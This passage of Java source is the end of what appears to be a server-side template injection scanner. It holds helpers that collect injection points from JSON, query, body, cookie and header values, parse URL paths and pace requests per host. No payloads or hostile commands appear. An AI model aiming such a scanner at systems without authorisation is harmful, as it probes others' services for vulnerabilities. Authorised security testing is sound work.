    private void extractJsonParams(com.google.gson.JsonObject obj, String prefix, List<InjectionTarget> targets) {
        for (String key : obj.keySet()) {
            com.google.gson.JsonElement val = obj.get(key);
            String fullKey = prefix.isEmpty() ? key : prefix + "." + key;
            if (val.isJsonPrimitive() && (val.getAsJsonPrimitive().isString() || val.getAsJsonPrimitive().isNumber())) {
                targets.add(new InjectionTarget(fullKey, val.getAsString(), TargetType.JSON));
            } else if (val.isJsonObject()) {
                extractJsonParams(val.getAsJsonObject(), fullKey, targets);
            }
        }
    }

    private String extractPath(String url) {
        try {
            if (url.contains("://")) url = url.substring(url.indexOf("://") + 3);
            int s = url.indexOf('/');
            if (s >= 0) { int q = url.indexOf('?', s); return q >= 0 ? url.substring(s, q) : url.substring(s); }
        } catch (Exception ignored) {}
        return url;
    }

    private void perHostDelay() throws InterruptedException {
        int delay = config.getInt("ssti.perHostDelay", 500);
        if (delay > 0) Thread.sleep(delay);
    }

    @Override
    public void destroy() { tested.clear(); }

    private enum TargetType { QUERY, BODY, COOKIE, JSON, HEADER }

    private static class InjectionTarget {
        final String name, originalValue;
        final TargetType type;
        InjectionTarget(String n, String v, TargetType t) { name = n; originalValue = v != null ? v : ""; type = t; }
    }

    public ConcurrentHashMap<String, Boolean> getTested() { return tested; }
}
